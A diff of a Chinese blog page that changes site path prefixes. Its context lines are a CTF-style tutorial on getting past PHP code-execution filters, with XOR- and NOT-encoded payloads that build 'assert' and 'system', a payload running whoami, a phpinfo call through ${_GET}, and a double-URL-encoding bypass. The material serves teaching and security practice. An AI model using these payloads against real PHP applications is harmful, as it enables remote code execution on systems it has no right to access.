 <figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">assert</span>($_GET[_]);<br></code></pre></td></tr></table></figure>
 
 <p>先转换assert</p>
-<p><img src="D:/mdimage/image-20220928205111449.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928205111449"> </p>
+<p><img src="D:/mdimage/image-20220928205111449.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928205111449"> </p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(&#x27;<span class="hljs-variable">%01</span>&#x27;^&#x27;<span class="hljs-variable">%60</span>&#x27;).(&#x27;<span class="hljs-variable">%08</span>&#x27;^&#x27;<span class="hljs-variable">%7</span>b&#x27;).(&#x27;<span class="hljs-variable">%08</span>&#x27;^&#x27;<span class="hljs-variable">%7</span>b&#x27;).(&#x27;<span class="hljs-variable">%05</span>&#x27;^&#x27;<span class="hljs-variable">%60</span>&#x27;).(&#x27;<span class="hljs-variable">%09</span>&#x27;^&#x27;<span class="hljs-variable">%7</span>b&#x27;).(&#x27;<span class="hljs-variable">%08</span>&#x27;^&#x27;<span class="hljs-variable">%7</span><span class="hljs-keyword">c</span>&#x27;).<br></code></pre></td></tr></table></figure>
 
 <p>因为前面这一个题目过滤掉了全部的字母，因此此时能够做变量的字符是剩下了<code>_</code>,于是我们便需要用下划线构造参数</p>
@@ -497,7 +497,7 @@
 
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">PS C:\Users\Administrator&gt; php -r <span class="hljs-string">&quot;var_dump(&#x27;000000&#x27;^&#x27;CICDU]&#x27;);&quot;</span><br>Command line code:1:<br>string(6) <span class="hljs-string">&quot;system&quot;</span><br><br></code></pre></td></tr></table></figure>
 
-<p><img src="D:/mdimage/image-20220928225744164.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928225744164"> </p>
+<p><img src="D:/mdimage/image-20220928225744164.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928225744164"> </p>
 <h2 id="另一个payload"><a href="#另一个payload" class="headerlink" title="另一个payload"></a>另一个payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br><span class="hljs-comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></code></pre></td></tr></table></figure>
 
 <p>通过他们之间异或来获得</p>
@@ -508,13 +508,13 @@
 <h2 id="无参数payload"><a href="#无参数payload" class="headerlink" title="无参数payload"></a>无参数payload</h2><p>我们直接进行取反操作</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>));<br><br></code></pre></td></tr></table></figure>
 
-<p><img src="D:/mdimage/image-20220928230641649.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928230641649"> </p>
+<p><img src="D:/mdimage/image-20220928230641649.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928230641649"> </p>
 <h2 id="有参数payload"><a href="#有参数payload" class="headerlink" title="有参数payload"></a>有参数payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;system&#x27;</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;whoami&#x27;</span>));<br><br><span class="hljs-comment">//结果如下：</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;%8C%86%8C%8B%9A%92&quot;</span> <span class="hljs-keyword">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;%88%97%90%9E%92%96&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>最终payload</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(~<span class="hljs-variable">%8</span>C<span class="hljs-variable">%86</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%92</span>)(~<span class="hljs-variable">%88</span><span class="hljs-variable">%97</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%92</span><span class="hljs-variable">%96</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="D:/mdimage/image-20220929160845063.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220929160845063"> </p>
+<p><img src="D:/mdimage/image-20220929160845063.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220929160845063"> </p>
 <h2 id="URL双写绕过"><a href="#URL双写绕过" class="headerlink" title="URL双写绕过"></a>URL双写绕过</h2><h3 id="最简单的考法"><a href="#最简单的考法" class="headerlink" title="最简单的考法"></a>最简单的考法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;xxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/hackerDJ/&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;not allowed&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;hackerDJ&quot;</span> == <span class="hljs-variable">$id</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
 
 <p>因为在提交的时候服务器会对url进行一次解码，所以我们需要双写绕过</p>
@@ -552,7 +552,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>PHP变量覆盖漏洞</div>
-      <div>https://blog.decemberus.com/2022/01/09/浅谈PHP代码执行中出现过滤限制的绕过执行方法/</div>
+      <div>https://decemberus.com/2022/01/09/浅谈PHP代码执行中出现过滤限制的绕过执行方法/</div>
     </div>
     <div class="license-meta">
       
@@ -594,7 +594,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blog.decemberus.com/2022/02/17/%E5%88%A9%E7%94%A8PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7Bypass/" title="PHP字符串解析">
+                      <a href="/decemberus.com/2022/02/17/%E5%88%A9%E7%94%A8PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7Bypass/" title="PHP字符串解析">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">PHP字符串解析</span>
                         <span class="visible-mobile">上一篇</span>
@@ -604,7 +604,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blog.decemberus.com/2022/01/09/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E6%9F%90%E4%BA%9B%E5%AE%89%E5%85%A8%E9%99%90%E5%88%B6/" title="PHP PCRE">
+                      <a href="/decemberus.com/2022/01/09/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E6%9F%90%E4%BA%9B%E5%AE%89%E5%85%A8%E9%99%90%E5%88%B6/" title="PHP PCRE">
                         <span class="hidden-mobile">PHP PCRE</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -730,8 +730,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/blog.decemberus.com/js/events.js" ></script>
-<script  src="/blog.decemberus.com/js/plugins.js" ></script>
+<script  src="/decemberus.com/js/events.js" ></script>
+<script  src="/decemberus.com/js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -755,7 +755,7 @@
 
 
   
-    <script  src="/blog.decemberus.com/js/img-lazyload.js" ></script>
+    <script  src="/decemberus.com/js/img-lazyload.js" ></script>
   
 
 
@@ -892,7 +892,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/blog.decemberus.com/js/local-search.js" ></script>
+  <script  src="/decemberus.com/js/local-search.js" ></script>
 
 
 
@@ -900,7 +900,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/blog.decemberus.com/js/boot.js" ></script>
+<script  src="/decemberus.com/js/boot.js" ></script>
 
 
   
